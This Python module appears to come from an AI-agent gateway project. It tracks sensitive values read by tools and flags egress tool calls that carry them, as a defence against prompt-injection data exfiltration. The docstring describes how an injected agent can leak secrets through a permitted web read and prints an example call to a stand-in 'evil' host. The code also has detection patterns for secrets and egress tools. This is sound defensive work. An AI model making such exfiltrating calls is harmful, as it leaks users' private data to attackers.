"""Data-flow taint tracking — the *data-flow* layer beneath the authority layer.

EIDOLON's authority gate bounds *which* tool calls may run; it intentionally
permits reads. But an attacker can exfiltrate through a permitted read (e.g.
``get_webpage("http://evil/?leak=<secret>")``) or a held-but-approved send — the
"read-only exfil" gap our AgentDojo evaluation measured (docs/eval-agentdojo.md).

This closes it, CaMeL-style (Debenedetti et al., "Defeating Prompt Injections by
Design"): track *sensitive* values that flowed out of private reads, and if any
of them appears in the arguments of an **egress** tool call, treat the call as
``data-exfiltration``. The tracker doesn't decide — it derives a dynamic
*exclusion* that the existing KAIROS gate denies and attests, so authority and
data-flow compose through one mechanism.

Inspectable and value-based: taint is a set of concrete sensitive strings
(IBANs, emails, long numbers/tokens) extracted from private outputs; a flow is
flagged when such a string reappears in an egress call's arguments.
"""

from __future__ import annotations

import json
import re
from collections.abc import Callable

# Marker exclusion produced when a sensitive value flows to an egress sink.
DATA_EXFILTRATION = "data-exfiltration"

# Candidate sensitive values: emails, IBAN-like, long digit runs, long tokens.
_VALUE_PATTERNS = [
    re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}"),   # email
    re.compile(r"\b[A-Z]{2}\d{2}[A-Z0-9]{10,30}\b"),                  # IBAN-ish
    re.compile(r"\b\d{6,}\b"),                                        # long number
    re.compile(r"\b[A-Za-z0-9]{12,}\b"),                             # long token/secret
]

_SENSITIVE_HINTS = ("balance", "iban", "user", "account", "email", "message",
                    "inbox", "file", "transaction", "password", "secret", "contact")
_EGRESS_PREFIXES = ("send_", "post_", "share_", "publish_", "upload_")
_EGRESS_EXACT = {"get_webpage"}  # a URL can carry data out


def default_sensitive_source(tool: str) -> bool:
    """Name-heuristic fallback: does this tool likely return private values?"""
    return any(h in tool.lower() for h in _SENSITIVE_HINTS)


def default_egress(tool: str) -> bool:
    """Name-heuristic fallback: can this tool carry data out?"""
    return tool in _EGRESS_EXACT or tool.startswith(_EGRESS_PREFIXES)


# Back-compat private aliases.
_default_sensitive = default_sensitive_source
_default_egress = default_egress


def extract_values(result: object) -> set[str]:
    """Extract candidate sensitive values from a tool result."""
    text = result if isinstance(result, str) else json.dumps(result, default=str)
    out: set[str] = set()
    for pat in _VALUE_PATTERNS:
        out.update(m.group(0) for m in pat.finditer(text))
    return {v for v in out if len(v) >= 6}


class TaintTracker:
    """Session-scoped value-flow tracker. One per gateway session."""

    def __init__(
        self,
        *,
        is_sensitive_source: Callable[[str], bool] = _default_sensitive,
        is_egress: Callable[[str], bool] = _default_egress,
    ) -> None:
        self._is_sensitive = is_sensitive_source
        self._is_egress = is_egress
        self._sensitive_values: set[str] = set()

    def observe(self, tool: str, result: object) -> None:
        """Learn sensitive values returned by a private read."""
        if self._is_sensitive(tool):
            self._sensitive_values |= extract_values(result)

    def exfiltration_exclusions(self, tool: str, arguments: dict) -> list[str]:
        """Return ``[DATA_EXFILTRATION]`` if this egress call carries a tainted value."""
        if not self._is_egress(tool) or not self._sensitive_values:
            return []
        blob = json.dumps(arguments, default=str)
        if any(v in blob for v in self._sensitive_values):
            return [DATA_EXFILTRATION]
        return []

    @property
    def tainted_values(self) -> set[str]:
        return set(self._sensitive_values)
